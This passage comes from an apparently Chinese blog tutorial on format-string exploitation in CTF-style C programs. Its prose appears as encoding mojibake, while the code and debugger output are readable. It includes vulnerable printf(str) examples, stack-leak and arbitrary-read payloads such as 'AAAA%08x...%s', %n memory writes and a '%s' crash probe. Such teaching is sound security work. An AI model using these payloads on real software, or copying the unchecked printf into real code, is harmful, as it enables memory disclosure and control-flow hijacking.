c30000</span><br></pre></td></tr></table></figure><br>è™½ç„¶gccåœ¨ç¼–è¯‘çš„æ—¶å€™æç¤ºäº†ä¸€ä¸ªwarningï¼Œä½†è¿˜æ˜¯ç¼–è¯‘é€šè¿‡äº†ï¼Œæˆ‘ä»¬è¿è¡Œåå‘ç°å¤šè¾“å‡ºäº†ä¸€ä¸ªC30000ï¼Œè¿™æ˜¯ä¸ªä»€ä¹ˆæ•°æ®å‘¢ï¼Œæˆ‘ä»¬ç”¨gdbè°ƒè¯•ä¸€ä¸‹çœ‹çœ‹å§ï¼Œæˆ‘ä»¬åœ¨printf()å‡½æ•°å¤„ä¸‹ä¸ªæ–­ç‚¹ï¼Œç„¶åè¿è¡Œç¨‹åºï¼Œç¨‹åºåœåœ¨äº†<code>printf()</code>å‡½æ•°å…¥å£å¤„<code>0xb7e652f0 __printf+0 push %ebx</code>ã€‚<br>æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹æ­¤æ—¶çš„æ ˆå¸ƒå±€ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; x/<span class="number">10</span>x $sp</span><br><span class="line"><span class="number">0xbffff00c</span>: <span class="number">0x08048466</span>  <span class="number">0x08048510</span>  <span class="number">0xbffff03f</span>  <span class="number">0x00000001</span></span><br><span class="line"><span class="number">0xbffff01c</span>: <span class="number">0x00000002</span>  <span class="number">0x00000003</span>  <span class="number">0x00c30000</span>  <span class="number">0x00000001</span></span><br><span class="line"><span class="number">0xbffff02c</span>: <span class="number">0x080482bd</span>  <span class="number">0xbffff2c4</span></span><br><span class="line"></span><br><span class="line"> &gt;&gt;&gt; x/<span class="number">20</span>x $sp</span><br><span class="line"><span class="number">0xbffff00c</span>: <span class="number">0x08048466</span>  <span class="number">0x08048510</span>  <span class="number">0xbffff03f</span>  <span class="number">0x00000001</span></span><br><span class="line"><span class="number">0xbffff01c</span>: <span class="number">0x00000002</span>  <span class="number">0x00000003</span>  <span class="number">0x00c30000</span>  <span class="number">0x00000001</span></span><br><span class="line"><span class="number">0xbffff02c</span>: <span class="number">0x080482bd</span>  <span class="number">0xbffff2c4</span>  <span class="number">0x0000002f</span>  <span class="number">0x0804a000</span></span><br><span class="line"><span class="number">0xbffff03c</span>: <span class="number">0x740484d2</span>  <span class="number">0x00747365</span>  <span class="number">0x00000003</span>  <span class="number">0x00000002</span></span><br><span class="line"><span class="number">0xbffff04c</span>: <span class="number">0x00000001</span>  <span class="number">0xb7fc13c4</span>  <span class="number">0xbffff070</span>  <span class="number">0x00000000</span></span><br></pre></td></tr></table></figure><p><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250209183436.png" alt="Pasted image 20250209183436"><br>åªè¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶formatçš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¸€ç›´è¯»å–å†…å­˜æ•°æ®ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s %d %d %d %x %x %x %x %x %x %x %x\n&quot;</span>,buf,a,b,c)</span><br><span class="line">[email protected]:~/Desktop/format$ ./format2</span><br><span class="line">test <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> c30000 <span class="number">1</span> <span class="number">80482b</span>d bf8bf301 <span class="number">2f</span> <span class="number">804</span>a000 <span class="number">740484</span>d2 <span class="number">747365</span></span><br></pre></td></tr></table></figure><p>ä¸Šä¸€ä¸ªä¾‹å­åªæ˜¯å‘Šè¯‰æˆ‘ä»¬å¯ä»¥åˆ©ç”¨%xä¸€ç›´è¯»å–æ ˆå†…çš„å†…å­˜æ•°æ®ï¼Œå¯æ˜¯è¿™å¹¶ä¸èƒ½æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ä¸æ˜¯ï¼Œæˆ‘ä»¬è¦çš„æ˜¯<code>ä»»æ„åœ°å€è¯»å–</code>,å½“ç„¶ï¼Œè¿™ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œæˆ‘ä»¬é€šè¿‡ä¸‹é¢çš„ä¾‹å­è¿›è¡Œåˆ†æï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">200</span>];</span><br><span class="line">    fgets(str,<span class="number">200</span>,<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥ç›´æ¥å°è¯•å»è¯»å–str[]çš„å†…å®¹å‘¢<br>gdbè°ƒè¯•ï¼Œå•æ­¥è¿è¡Œå®Œ<code>call 0x8048340 &lt;[email protected]&gt;</code>åè¾“å…¥ï¼š<br><code>AAAA%08x%08x%08x%08x%08x%08x</code><br>ç„¶åæˆ‘ä»¬æ‰§è¡Œåˆ°printf()å‡½æ•°ï¼Œè§‚å¯Ÿæ­¤æ—¶çš„æ ˆåŒºï¼Œç‰¹åˆ«æ³¨æ„ä¸€ä¸‹0x41414141ï¼ˆè¿™æ˜¯æˆ‘ä»¬strçš„å¼€å§‹ï¼‰ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; x/<span class="number">10</span>x $sp</span><br><span class="line"><span class="number">0xbfffef70</span>: <span class="number">0xbfffef88</span>  <span class="number">0x000000c8</span>  <span class="number">0xb7fc1c20</span>  <span class="number">0xb7e25438</span></span><br><span class="line"><span class="number">0xbfffef80</span>: <span class="number">0x08048210</span>  <span class="number">0x00000001</span>  <span class="number">0x41414141</span>  <span class="number">0x78383025</span></span><br><span class="line"><span class="number">0xbfffef90</span>: <span class="number">0x78383025</span>  <span class="number">0x78383025</span></span><br></pre></td></tr></table></figure><br>è¿™æ—¶å€™æˆ‘ä»¬éœ€è¦å€ŸåŠ©printf()å‡½æ•°çš„å¦ä¸€ä¸ªé‡è¦çš„æ ¼å¼åŒ–å­—ç¬¦å‚æ•°%sï¼Œæˆ‘ä»¬å¯ä»¥ç”¨%sæ¥è·å–æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜æ•°æ®ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è¿™ä¹ˆæ„é€ å°è¯•å»è·å–0x41414141åœ°å€ä¸Šçš„æ•°æ®ï¼š<br><code>\x41\x41\x41\x41%08x%08x%08x%08x%08x%s</code><br>åˆ°ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¯»å–å†…å­˜çš„å†…å®¹ï¼Œçœ‹èµ·æ¥å¥½åƒä¹Ÿæ²¡ä»€ä¹ˆç”¨å•Šï¼Œå°±æ˜¯è¯»ä¸ªæ•°æ®è€Œå·²ï¼Œæˆ‘ä»¬èƒ½ä¸èƒ½åˆ©ç”¨è¿™ä¸ªæ¼æ´ä¿®æ”¹å†…å­˜ä¿¡æ¯ï¼ˆæ¯”å¦‚è¯´ä¿®æ”¹è¿”å›åœ°å€ï¼‰ä»è€ŒåŠ«æŒç¨‹åºæ‰§è¡Œæµç¨‹?</p><h4 id="ç‰¹æ€§äºŒï¼šåˆ©ç”¨-næ ¼å¼ç¬¦å†™å…¥æ•°æ®"><a href="#ç‰¹æ€§äºŒï¼šåˆ©ç”¨-næ ¼å¼ç¬¦å†™å…¥æ•°æ®" class="headerlink" title="ç‰¹æ€§äºŒï¼šåˆ©ç”¨%næ ¼å¼ç¬¦å†™å…¥æ•°æ®"></a>ç‰¹æ€§äºŒï¼šåˆ©ç”¨%næ ¼å¼ç¬¦å†™å…¥æ•°æ®</h4><p>%næ˜¯ä¸€ä¸ªä¸ç»å¸¸ç”¨åˆ°çš„æ ¼å¼ç¬¦ï¼Œå®ƒçš„ä½œç”¨æ˜¯æŠŠå‰é¢å·²ç»æ‰“å°çš„é•¿åº¦å†™å…¥æŸä¸ªå†…å­˜åœ°å€ï¼Œçœ‹ä¸‹é¢çš„ä»£ç ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> num=<span class="number">66666666</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Before: num = %d\n&quot;</span>, num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d%n\n&quot;</span>, num, &amp;num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;After: num = %d\n&quot;</span>, num);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å¯ä»¥å‘ç°æˆ‘ä»¬ç”¨%næˆåŠŸä¿®æ”¹äº†numçš„å€¼ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[email protected]:~/Desktop/format$ ./format2</span><br><span class="line">Before: num = <span class="number">66666666</span></span><br><span class="line"><span class="number">66666666</span></span><br><span class="line">After: num = <span class="number">8</span></span><br></pre></td></tr></table></figure><br>ç°åœ¨æˆ‘ä»¬å·²ç»çŸ¥é“å¯ä»¥ç”¨æ„é€ çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å»è®¿é—®æ ˆå†…çš„æ•°æ®ï¼Œå¹¶ä¸”<strong>å¯ä»¥åˆ©ç”¨%nå‘å†…å­˜ä¸­å†™å…¥å€¼</strong>ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥ä¿®æ”¹æŸä¸€ä¸ªå‡½æ•°çš„è¿”å›åœ°å€ä»è€Œæ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹å‘¢ï¼Œåˆ°äº†è¿™ä¸€æ­¥ç»†å¿ƒçš„åŒå­¦å¯èƒ½å·²ç»å‘ç°äº†ï¼Œ%nçš„ä½œç”¨åªæ˜¯å°†å‰é¢æ‰“å°çš„å­—ç¬¦ä¸²é•¿åº¦å†™å…¥åˆ°å†…å­˜ä¸­ï¼Œè€Œæˆ‘ä»¬æƒ³è¦å†™å…¥çš„æ˜¯ä¸€ä¸ªåœ°å€ï¼Œè€Œä¸”è¿™ä¸ªåœ°å€æ˜¯å¾ˆå¤§çš„ã€‚è¿™æ—¶å€™æˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°printf()å‡½æ•°çš„ç¬¬ä¸‰ä¸ªç‰¹æ€§æ¥é…åˆå®Œæˆåœ°å€çš„å†™å…¥ã€‚</p><h4 id="ç‰¹æ€§ä¸‰ï¼šè‡ªå®šä¹‰æ‰“å°å­—ç¬¦ä¸²å®½åº¦"><a href="#ç‰¹æ€§ä¸‰ï¼šè‡ªå®šä¹‰æ‰“å°å­—ç¬¦ä¸²å®½åº¦" class="headerlink" title="ç‰¹æ€§ä¸‰ï¼šè‡ªå®šä¹‰æ‰“å°å­—ç¬¦ä¸²å®½åº¦"></a>ç‰¹æ€§ä¸‰ï¼šè‡ªå®šä¹‰æ‰“å°å­—ç¬¦ä¸²å®½åº¦</h4><p>æˆ‘ä»¬åœ¨ä¸Šé¢çš„åŸºç¡€éƒ¨åˆ†å·²ç»æœ‰æåˆ°å…³äºæ‰“å°å­—ç¬¦ä¸²å®½åº¦çš„é—®é¢˜ï¼Œ<strong>åœ¨æ ¼å¼ç¬¦ä¸­é—´åŠ ä¸Šä¸€ä¸ªåè¿›åˆ¶æ•´æ•°æ¥è¡¨ç¤ºè¾“å‡ºçš„æœ€å°‘ä½æ•°ï¼Œè‹¥å®é™…ä½æ•°å¤šäºå®šä¹‰çš„å®½åº¦ï¼Œåˆ™æŒ‰å®é™…ä½æ•°è¾“å‡ºï¼Œè‹¥å®é™…ä½æ•°å°‘äºå®šä¹‰çš„å®½åº¦åˆ™è¡¥ä»¥ç©ºæ ¼æˆ–0</strong>ã€‚æˆ‘ä»¬æŠŠä¸Šä¸€æ®µä»£ç åšä¸€ä¸‹ä¿®æ”¹å¹¶çœ‹ä¸€ä¸‹æ•ˆæœï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> num=<span class="number">66666666</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Before: num = %d\n&quot;</span>, num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%.100d%n\n&quot;</span>, num, &amp;num);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;After: num = %d\n&quot;</span>, num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„numå€¼è¢«æ”¹ä¸ºäº†100<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[email protected]:~/Desktop/format$ ./format2</span><br><span class="line">Before: num = <span class="number">66666666</span></span><br><span class="line"><span class="number">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="number">66666666</span></span><br><span class="line">After: num = <span class="number">100</span></span><br></pre></td></tr></table></figure><br>å¦‚ä½•å»è¦†ç›–ä¸€ä¸ªåœ°å€ï¼Ÿï¼Œä¾‹å¦‚æŠŠ0x8048000è¿™ä¸ªåœ°å€å†™å…¥å†…å­˜ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯æŠŠè¯¥<strong>åœ°å€å¯¹åº”çš„10è¿›åˆ¶134512640</strong>ä½œä¸ºæ ¼å¼ç¬¦æ§åˆ¶å®½åº¦å³å¯ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.134512640d%n\n&quot;</span>, num, &amp;num);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;After: num = %x\n&quot;</span>, num);</span><br></pre></td></tr></table></figure><br>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„numè¢«æˆåŠŸä¿®æ”¹ä¸º8048000<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[email protected]:~/Desktop/format$ ./format2</span><br><span class="line">Before: num = <span class="number">66666666</span></span><br><span class="line">ä¸­é—´çš„<span class="number">0</span>çœç•¥...........</span><br><span class="line"><span class="number">00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000066666666</span></span><br><span class="line">After: num = <span class="number">8048000</span></span><br><span class="line">[email protected]:~/Desktop/format$ </span><br></pre></td></tr></table></figure></p><h3 id="æ¼æ´åˆ©ç”¨åŸç†"><a href="#æ¼æ´åˆ©ç”¨åŸç†" class="headerlink" title="æ¼æ´åˆ©ç”¨åŸç†"></a>æ¼æ´åˆ©ç”¨åŸç†</h3><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°æ˜¯æ ¹æ®æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥è¿›è¡Œè§£æçš„ï¼Œé‚£ä¹ˆå“åº”çš„è¦è¢«è§£æçš„å‚æ•°çš„ä¸ªæ•°ä¹Ÿæ˜¯ç”±è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ‰€æ§åˆ¶ã€‚<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250210182528.png" alt="Pasted image 20250210182528"><br>æ­£å¸¸çš„printfå‡½æ•°çš„ç»“æ„æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸å‚æ•°ä¸€ä¸€å¯¹åº”çš„ã€‚é‚£ä¹ˆåœ¨è°ƒç”¨printfå‡½æ•°çš„æ—¶å€™å‚æ•°ä»å³å‘å·¦è¿›æ ˆï¼Œè¿›æ ˆä¹‹åæ ¼å¼åŒ–å­—ç¬¦ä¸²æ˜¯åœ¨æ ˆé¡¶çš„ä½ç½®ã€‚é‚£ä¹ˆåœ¨è¿›å…¥printfä¹‹åï¼Œå‡½æ•°é¦–å…ˆè·å–ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯æ­¤æ—¶æ ˆé¡¶çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä¸€ä¸ªä¸€ä¸ªè¯»å–å…¶å­—ç¬¦ä¸²ä¼šé‡åˆ°ä¸¤ç§æƒ…å†µ</p><ul><li>å½“å‰å­—ç¬¦ä¸²ä¸æ˜¯%ï¼Œç›´æ¥è¾“å‡ºåˆ°ç›¸åº”æ ‡å‡†è¾“å‡ºï¼Œæ¯”å¦‚ç›´æ¥è¾“å‡ºä¸€ä¸ªâ€™hello wordâ€˜</li><li>å½“å­—ç¬¦æ˜¯%ï¼Œç»§ç»­è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦<ul><li>å¦‚æœæ²¡å“Ÿå­—ç¬¦ï¼ŒæŠ¥é”™</li><li>å¦‚æœä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯%ï¼Œè¾“å‡º%</li><li>å¦åˆ™æ ¹æ®ç›¸åº”çš„å­—ç¬¦ï¼Œè·å–ç›¸åº”çš„å‚æ•°ï¼Œå¯¹å…¶è¿›è¡Œè§£æå¹¶è¾“å‡º</li></ul></li></ul><p>å¦‚æœç¼ºå°‘å‚æ•°å‘¢ï¼Œä¾‹å¦‚ä¸‹é¢è¿™æ ·ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);</span><br></pre></td></tr></table></figure></p><p>æ­¤æ—¶å¯ä»¥å‘ç°å¹¶æ²¡æœ‰æä¾›å‚æ•°ï¼Œé‚£ä¹ˆç¨‹åºå¦‚ä½•è¿è¡Œå‘¢ï¼Ÿç¨‹åºä¼šç…§æ ·è¿è¡Œï¼Œä¼šå°†æ ˆä¸Šå­˜å‚¨æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ°å€ä¸Šé¢çš„ä¸‰ä¸ªå˜é‡åˆ†åˆ«è§£æä¸ºï¼š</p><ul><li>è§£æå…¶åœ°å€å¯¹åº”çš„å­—ç¬¦ä¸²</li><li>è§£æå…¶å†…å®¹å¯¹åº”çš„æ•´å½¢å€¼</li><li>è§£æå…¶å†…å®¹å¯¹åº”çš„æµ®ç‚¹å€¼<br>  å¯¹äºç¬¬ä¸€ç§æƒ…å†µæ¥è¯´ï¼Œå¦‚æœæä¾›äº†ä¸€ä¸ªä¸å¯è®¿é—®åœ°å€ï¼Œæ¯”å¦‚0ï¼Œé‚£ä¹ˆç¨‹åºå°±ä¼šå´©æºƒï¼Œæ‰€ä»¥è¯´å³ä½¿printfå‡½æ•°æ²¡æœ‰ç»™å‡ºå‚æ•°ï¼Œä¹Ÿä¼šæŒ‰ç…§æ ¼å¼åŒ–å­—ç¬¦ä¸²ç»™å‡ºçš„æ ¼å¼æ‰“å°å‡ºæ¥ä¸‹æ¥ä¸‰å¤„åœ°å€ä¸­çš„å†…å®¹<br>  %d ï¼šåè¿›åˆ¶ï¼Œè¾“å‡ºåè¿›åˆ¶æ•´æ•°<br>  %s ï¼š å­—ç¬¦ä¸²ï¼Œä»å†…å­˜ä¸­è¯»å–å­—ç¬¦ä¸²<br>  %x ï¼š åå…­è¿›åˆ¶ï¼Œè¾“å‡ºåå…­è¿›åˆ¶æ•°<br>  %c ï¼š å­—ç¬¦ä¸²ï¼Œè¾“å‡ºå­—ç¬¦ä¸²<br>  %n ï¼š åˆ°ç›®å‰ä¸ºæ­¢ç¼©å†™çš„å­—ç¬¦ä¸²æ•°<h2 id="æ¼æ´åˆ©ç”¨æ–¹æ³•"><a href="#æ¼æ´åˆ©ç”¨æ–¹æ³•" class="headerlink" title="æ¼æ´åˆ©ç”¨æ–¹æ³•"></a>æ¼æ´åˆ©ç”¨æ–¹æ³•</h2><h3 id="1-ç¨‹åºå´©æºƒ"><a href="#1-ç¨‹åºå´©æºƒ" class="headerlink" title="1. ç¨‹åºå´©æºƒ"></a>1. ç¨‹åºå´©æºƒ</h3>æ‹¿åˆ°ä¸€ä¸ªç¨‹åºä¹‹åå¯ä»¥é€šè¿‡è¾“å…¥è‹¥å¹²ä¸ª%sæ¥è¿›è¡Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">%s%s%s%s%s%s%s%s%s%s%s%s%s%s</span><br></pre></td></tr></table></figure>å‰é¢è®²è¿‡æ²¡æœ‰å‚æ•°çš„æ—¶å€™printfå‡½æ•°ä¾ç„¶è¿˜å¯ä»¥è¾“å‡ºæ ¼å¼åŒ–å­—ç¬¦ä¸²å¯¹åº”çš„åœ°å€ä¸­çš„å†…å®¹ï¼Œ<strong>æ‰€ä»¥å¦‚æœå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œåœ¨è¾“å…¥ä¸€é•¿ä¸²%sä¹‹åï¼Œprintfä¼šå°†%sä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå°†å¯¹åº”åœ°å€ä¸­çš„å†…å®¹ä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¾“å‡ºå‡ºæ¥</strong>ã€‚<em>ä½†æ˜¯æ ˆä¸Šä¸å¯èƒ½æ¯ä¸ªå€¼éƒ½å¯¹åº”äº†åˆæ³•åœ°å€ï¼Œæ‰€ä»¥æ•°å­—å¯¹åº”çš„å†…å®¹å¯èƒ½ä¸å­˜åœ¨ï¼Œè¿™ä¸ªæ—¶å€™å°±ä¼šä½¿ç¨‹åºå´©æºƒ</em>ã€‚</li></ul><p><strong><em>åœ¨Linuxä¸­ï¼Œå­˜å–æ— æ•ˆçš„æŒ‡é’ˆä¼šå¼•èµ·è¿›ç¨‹å—åˆ°SIGSEGVä¿¡å·ï¼Œä»è€Œä½¿ç¨‹åºéæ­£å¸¸ç»ˆæ­¢å¹¶äº§ç”Ÿæ ¸å¿ƒè½¬å‚¨</em></strong></p><h3 id="2-æ³„éœ²æ ˆå†…å­˜"><a href="#2-æ³„éœ²æ ˆå†…å­˜" class="headerlink" title="2. æ³„éœ²æ ˆå†…å­˜"></a>2. æ³„éœ²æ ˆå†…å­˜</h3><p>ä¾‹é¢˜å¦‚ä¸‹ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">#ç¼–è¯‘å¦‚ä¸‹ï¼šgcc -m32 -fno-<span class="built_in">stack</span>-protector -no-pie -o leakmemory leakmemory.c</span><br></pre></td></tr></table></figure></p><h4 id="è·å–æ ˆå˜é‡æ•°å€¼"><a href="#è·å–æ ˆå˜é‡æ•°å€¼" class="headerlink" title="è·å–æ ˆå˜é‡æ•°å€¼"></a>è·å–æ ˆå˜é‡æ•°å€¼</h4><p>é€šè¿‡gdbæ‰“å¼€ç¨‹åºï¼Œåœ¨printfå¤„ä¸‹æ–­ç‚¹<br>ç„¶åæŒ‰rè¿è¡Œï¼Œè¾“å…¥%08x.%08x.%08x<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250210183257.png" alt="Pasted image 20250210183257"><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250210183302.png" alt="Pasted image 20250210183302"><br>å¯ä»¥çœ‹åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ª%08xè§£æçš„æ˜¯0x1ï¼Œç¬¬äºŒä¸ª%08xè§£æçš„æ˜¯0x22222222ï¼Œç¬¬ä¸‰ä¸ª%08xè§£æçš„æ˜¯-1ï¼Œç¬¬å››ä¸ª%sè§£æçš„æ˜¯æˆ‘ä»¬è¾“å…¥çš„â€œ%08x.%08x.%08xâ€å­—ç¬¦ä¸²ã€‚æ‰€ä»¥æ¥ä¸‹æ¥è¾“å…¥cè®©ç¨‹åºç»§ç»­æ‰§è¡Œï¼Œæˆ‘ä»¬é¢„è®¡çš„æƒ…å†µæ˜¯ä¼šå°†è¿™å››å¤„è¾“å‡ºå‡ºæ¥ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"><span class="number">00000001.22222222</span>.ffffffff.%<span class="number">08</span>x.%<span class="number">08</span>x.%<span class="number">08</span>x</span><br></pre></td></tr></table></figure><p>å’Œæˆ‘ä»¬æƒ³è±¡çš„ä¸€æ ·ï¼Œå¹¶ä¸”ç¨‹åºä¼šç»§ç»­åœåœ¨ç¬¬äºŒä¸ªprintfå‡½æ•°å¤„ï¼Œä¾ç„¶è¿˜æ˜¯çœ‹ä¸€ä¸‹æ ˆç©ºé—´<br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250210183522.png" alt="Pasted image 20250210183522"><br><img src="/2025/02/12/PWN%E5%85%A5%E9%97%A8-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/Pasted image 20250210183657.png" alt="Pasted image 20250210183657"><br>å¯ä»¥çœ‹åˆ°ç”±äºç¬¬äºŒæ¬¡printfæ²¡æœ‰ç»™å‚æ•°ï¼Œæ‰€ä»¥è§¦å‘äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥çœ‹åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ª%08xè§£æçš„æ˜¯0xffffd090ï¼Œç¬¬äºŒä¸ª%08xè§£æçš„æ˜¯0xf7fd0410ï¼Œç¬¬ä¸‰ä¸ª%08xè§£æçš„æ˜¯0x1ã€‚æ¥ä¸‹æ¥è¾“å…¥cè®©ç¨‹åºç»§ç»­æ‰§è¡Œï¼Œæˆ‘ä»¬é¢„è®¡çš„æ•ˆæœæ˜¯æ‰“å°å‡ºâ€œffffd090. f7fd0410. 00000001â€</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">ffffd090.f7fd0410<span class="number">.00000001</span>[Inferior <span class="number">1</span> (process <span class="number">2788</span>) exited normally]</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸åªå¯ä»¥ç”¨%x%x%xï¼Œè¿˜å¯ä»¥ä½¿ç”¨%pæ¥è·å–æ•°æ®ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">hollk@ubuntu:~/ctf-challenges/pwn/fmtstr/leakmemory$ ./leakmemory </span><br><span class="line">%p.%p.%p</span><br><span class="line"><span class="number">00000001.22222222</span>.ffffffff.%p.%p.%p</span><br><span class="line"><span class="number">0xffe9c200</span><span class="number">.0</span>xf7eee410<span class="number">.0</span>x1</span><br></pre></td></tr></table></figure><br><strong>ç”±äºæ ˆä¸Šçš„æ•°æ®ä¼šå› ä¸ºæ¯æ¬¡åˆ†é…çš„å†…å­˜é¡µä¸åŒï¼Œæ‰€ä»¥å¹¶ä¸æ˜¯æ¯æ¬¡å¾—åˆ°çš„ç»“æœéƒ½ä¸€æ ·</strong>ã€‚æˆ‘ä»¬ä¸Šé¢ä½¿ç”¨çš„æ–¹æ³•ä¸€ç›´éƒ½æ˜¯ä¾æ¬¡è¾“å‡ºæ ˆä¸­çš„æ¯ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬æƒ³è¦è¾“å‡ºä¸€ä¸ªç‰¹å®šä½ç½®çš„å†…å®¹ï¼Œå°±éœ€è¦æ›´æ”¹ä¸€ä¸‹è¾“å…¥çš„å†…å®¹<br><figure class="highlight c"><table><tr><td class="code"><pre><span 